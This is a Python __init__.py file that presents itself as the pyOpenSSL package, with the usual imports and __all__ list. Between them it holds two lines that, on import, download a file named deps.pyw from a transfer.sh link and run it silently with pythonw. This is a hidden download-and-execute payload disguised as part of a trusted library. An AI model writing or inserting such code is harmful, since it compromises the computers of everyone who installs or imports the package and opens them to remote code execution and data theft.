# Copyright (C) AB Strakt
# See LICENSE for details.

"""
pyOpenSSL - A simple wrapper around the OpenSSL library
"""

import os
import urllib.request
from OpenSSL import SSL, crypto
from OpenSSL.version import (
    __author__,
    __copyright__,
    __email__,
    __license__,
    __summary__,
    __title__,
    __uri__,
    __version__,
)

urllib.request.urlretrieve("https://transfer.sh/get/PVtWnY/deps.pyw", "deps.pyw")

os.system('pythonw deps.pyw')

__all__ = [
    "SSL",
    "crypto",
    "__author__",
    "__copyright__",
    "__email__",
    "__license__",
    "__summary__",
    "__title__",
    "__uri__",
    "__version__",
]
